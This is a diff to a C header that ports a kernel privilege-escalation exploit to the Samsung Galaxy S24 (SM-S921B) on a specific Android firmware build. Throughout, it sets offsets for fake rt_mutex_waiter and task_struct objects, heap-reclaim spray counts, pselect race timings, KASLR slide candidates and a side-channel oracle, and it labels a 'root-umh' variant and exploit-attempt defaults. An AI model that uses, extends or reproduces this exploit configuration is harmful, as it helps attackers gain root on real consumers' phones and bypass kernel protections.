@@ -1,9 +1,37 @@
 #ifndef OFFSET_H
 #define OFFSET_H
 
+/*
+ * Samsung Galaxy S24 (SM-S921B, e1s, Exynos 2400), Android 17
+ * build S921BXXUHEZIF, kernel 6.1.162-android14-11.
+ *
+ * Symbol- and layout-derived constants are re-derived from this firmware's
+ * own boot kernel Image, System.map and .BTF (see docs/SM-S921B-S921BXXUHEZIF.md).
+ * The slide/PI runtime geometry follows the device-validated compact-waiter
+ * family (e1s-S921BXXSFDZE1), because this kernel's rt_mutex_waiter layout is
+ * byte-identical to that family's; those knobs are marked unverified for this
+ * build in the docs record until the on-device pass lands.
+ */
+
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL "e1s-S921BXXUHEZIF-app-physical-p0-oracle"
+#define APP_DEFAULT_FAST_KSNITCH 1
 #define APP_PHYS_P0_ORACLE 1
+#define APP_REQUIRE_FRESH_P0_SESSION 1
+#define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
+#define APP_FOPS_DATA_ALIAS_GATE_VERIFY 1
+#define APP_P0_FINGERPRINT_INVERSE_SLIDE 1
+#define APP_FOPS_REUSE_VERIFIED_PAGE 1
+#define APP_PRODUCTION_SLOT_PI_RIGHT 0
+#define APP_PRODUCTION_SLOT_PROVEN_LEFT 1
+#define APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY 1
+#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
+#define APP_FOPS_DEFER_ALIAS_READBACK 1
+#define APP_FOPS_DURABLE_POSTWRITE_LOG 1
+#define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
+#define APP_FOPS_TABLE_MIRROR_OFF 0x1e80
+#define APP_KERNEL_PAGE_KSNITCH_IDENTITY_END 0xffffff8080000000ULL
+#define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
 #else
 #define BUILD_VARIANT_LABEL "e1s-S921BXXUHEZIF-root-umh"
 #endif
@@ -17,7 +45,33 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x80000000ULL
-#define SKB_DATA_DELTA (-0xe80LL)
+
+/*
+ * mm_struct is 0x3c0 in this kernel's BTF, but the SLUB stride the reclaim
+ * walk sees on this kernel family is 0x400. The same 6.1.162-android14-11
+ * build on S24 Ultra (docs/SM-S926B-S926BXXUEDZDR.md) showed on hardware that
+ * neither the repository default 0x500 nor a literal 0x3c0 enumerates the
+ * candidate boundaries correctly. The value is taken from the validated e1s
+ * profiles and is listed as pending confirmation for this build.
+ */
+#define MM_STRUCT_SZ 0x400
+#define MM_ORDER 3
+
+/* skb->head lands one 4 KiB page behind the reclaimed object it aliases. */
+#define SKB_DATA_DELTA (-0x1000LL)
+
+/*
+ * Ksnitch measurement parameters. This kernel is CONFIG_ARM64_MTE=y with
+ * CONFIG_KASAN_HW_TAGS=y, so the tagged-pointer measurement path is the
+ * correct one; these values are shared by every device-validated 6.1
+ * compact-waiter profile (e1s-S921BXXSFDZE1, e1s-S921NKSSFDZF3,
+ * e2s-S926BXXUEDZDR).
+ */
+#define KERNELSNITCH_MTE_ENABLED 1
+#define KERNELSNITCH_VERBOSE 1
+#define KERNELSNITCH_FUTEX_HASH_SIZE 0x1000
+#define KSNITCH_COLLISIONS 5
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
@@ -25,7 +79,46 @@
 #define SLIDE_USE_FAKE_TASK 1
 #define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbeb8ULL
-#define SLIDE_PSELECT_WORD_SHIFT 0
+
+/*
+ * Leading 64-bit words skipped before fake rt_mutex_waiter word zero in the
+ * logical read/write/exception fd-set array. Inherited from the validated
+ * compact-layout e1s profiles; unverified on this build.
+ */
+#define SLIDE_PSELECT_WORD_SHIFT 3
+
+/* Reclaim and pselect timing tuned on-device for the compact-waiter family. */
+#define APP_SLIDE_RECLAIM_SENDS 192
+#define APP_SLIDE_RECLAIM_SNDBUF 16777216
+#define APP_MM_LATE_DRAIN_TRIGGERS 2
+#define APP_DEFER_FINAL_DRAIN_REAP 1
+#define APP_DEFER_ALL_DRAIN_REAPS 1
+#define APP_QUIET_RECLAIM_WINDOW 1
+#define APP_SLIDE_MIN_OBJECT_INDEX 27
+#define APP_SLIDE_MAX_OBJECT_INDEX 30
+#define APP_FOPS_MIN_OBJECT_INDEX 24
+#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
+#define APP_FOPS_PSELECT_DELAY_USEC 50000
+#define SLIDE_SYNC_PSELECT_SYSCALL 1
+#define SLIDE_GUARD_PSELECT_SYSCALL 1
+#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
+#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
+#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
+#define APP_ACCEPT_SCHED_TRIGGER 1
+#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
+
+/*
+ * kmalloc cache rows for the pipe-buffer reclaim gate. Target BTF defines
+ * enum kmalloc_cache_type { NORMAL=0, DMA=0, CGROUP=1, RECLAIM=2, NR_KMALLOC_TYPES=3 },
+ * and System.map bounds kmalloc_caches with the next symbol at an interval of
+ * 0x150 (3 rows x 14 qwords). The shared common.h defaults (type 2, 4 rows)
+ * would read the RECLAIM row and one row past the array. The profile selects
+ * the compact-family values proven on the hardware-validated S921N SFDZF3
+ * build: cgroup row index 1, three cache types.
+ */
+#define KMALLOC_CGROUP_TYPE 1
+#define KMALLOC_CACHE_TYPES 3
+
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
   0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
@@ -40,12 +133,22 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define ROUTE_WAIT_SECONDS 8
 #define PSELECT_ENTER_DELAY_USEC 50000
-#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+#define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
+#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
+#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
+#define APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES 16
+#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
+#define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 16
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
+#define DEFAULT_EXPLOIT_ATTEMPTS 1
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
-#define SLIDE_BANK_SLOTS 4
-#define SLIDE_BANK_TASK_OFF 0x1000
+#define SLIDE_BANK_SLOTS 5
+#define SLIDE_BANK_TASK_OFF 0x3200
 #define SLIDE_BANK_TASK_STRIDE 0x1c0
 #define SLIDE_BANK_LOCK_OFF 0x5200
 #define SLIDE_BANK_SLOT_STRIDE 0x100
@@ -54,6 +157,7 @@
 #define P0_ORACLE_PROBE_SLOT 1
 #define P0_ORACLE_GATE_RESTORE_SLOT 2
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
+#define P0_ORACLE_PRODUCTION_SLOT 4
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
 #define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
@@ -140,16 +244,18 @@
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-#define FAKE_WAITER_TREE_PRIO_OFF 0x18
-#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
-#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
-#define FAKE_WAITER_TASK_OFF 0x50
-#define FAKE_WAITER_LOCK_OFF 0x58
-#define FAKE_WAITER_WAKE_STATE_OFF 0x60
-#define FAKE_WAITER_WW_CTX_OFF 0x68
+/* rt_mutex_waiter exactly as this kernel's BTF lays it out (size 0x58). */
+#define COMPACT_RT_MUTEX_WAITER 1
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
+#define FAKE_WAITER_TASK_OFF 0x30
+#define FAKE_WAITER_LOCK_OFF 0x38
+#define FAKE_WAITER_WAKE_STATE_OFF 0x40
+#define FAKE_WAITER_PRIO_OFF 0x44
+#define FAKE_WAITER_DEADLINE_OFF 0x48
+#define FAKE_WAITER_WW_CTX_OFF 0x50
+#define FAKE_WAITER_LAYOUT_SIZE 0x58
 
+/* task_struct members from this kernel's BTF (task_struct is 0x12c0). */
 #define FAKE_TASK_USAGE_OFF 0x40
 #define FAKE_TASK_PRIO_OFF 0x84
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
